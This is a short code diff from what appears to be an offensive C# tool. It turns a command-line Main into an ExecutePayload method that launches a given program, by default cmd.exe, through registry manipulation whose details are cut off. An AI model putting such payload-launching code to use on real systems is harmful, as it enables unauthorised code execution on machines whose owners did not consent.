@@ -11,20 +11,8 @@ namespace Hyperthreading
 {
     class Default
     {
-        public static void Main(string[] args)
+        public static void ExecutePayload(string payload)
         {
-
-            string payload = "";
-
-            if (args.Length > 0)
-            {
-                payload = args[0];
-            }
-            else
-            {
-                payload = @"C:\Windows\System32\cmd.exe";
-            }
-
             try
             {
                 Microsoft.Win32.RegistryKey key;
